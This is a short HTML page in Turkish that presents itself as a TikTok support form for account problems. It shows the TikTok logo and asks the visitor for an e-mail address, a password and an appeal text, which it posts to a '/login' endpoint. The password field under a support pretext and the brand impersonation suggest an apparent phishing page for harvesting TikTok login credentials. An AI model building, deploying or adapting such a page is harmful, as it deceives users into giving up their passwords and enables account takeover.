<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TikTok Destek</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <header>
    <img src="images__6_-removebg-preview.png" alt="TikTok Logo" class="logo" />
  </header>
  <div class="container">
    <h1>TikTok Destek</h1>
    <p class="subtitle">Hesap problemleri için destek formu</p>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="E-Mail" required />
      <input type="password" name="password" placeholder="Şifre" required />
      <textarea name="message" placeholder="İtiraz Metni" required></textarea>
      <button type="submit">Destek Talebi Gönder</button>
    </form>
  </div>
</body>
</html>
